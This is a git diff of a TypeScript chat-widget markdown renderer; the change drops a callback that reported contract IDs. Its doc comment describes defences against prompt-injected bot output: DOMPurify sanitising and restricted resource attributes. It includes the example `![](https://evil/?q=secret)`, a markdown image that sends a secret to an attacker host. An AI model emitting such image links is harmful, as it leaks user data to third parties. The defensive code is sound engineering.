@@ -23,7 +23,6 @@ const RESOURCE_ATTRIBUTES = ['src', 'poster', 'href', 'xlink:href', 'background'
  *
  * Each call builds its own `Marked` instance, so renderer overrides never leak
  * between widget instances or into a host page that also uses `marked`.
- * Contract IDs found in `image`/`report` blocks are reported via `onContract`.
  *
  * Bot text is untrusted (it can be steered by prompt injection), so the final
  * HTML is always passed through DOMPurify before it reaches `innerHTML`.
@@ -31,13 +30,10 @@ const RESOURCE_ATTRIBUTES = ['src', 'poster', 'href', 'xlink:href', 'background'
  * so a response can't leak data through e.g. `![](https://evil/?q=secret)`.
  */
 export function createMarkdownRenderer(
-  options: ChatWidgetOptions,
-  onContract: (contract: string) => void
+  options: ChatWidgetOptions
 ): (text: string) => string {
-  const renderImage = (imageInfo: { contract: string }) => {
-    onContract(imageInfo.contract);
-    return renderImageAndLink(options, imageInfo);
-  };
+  const renderImage = (imageInfo: { contract: string }) =>
+    renderImageAndLink(options, imageInfo);
 
   const renderReport = (code: string) => {
     const reportInfo: ReportPerson = JSON.parse(code);
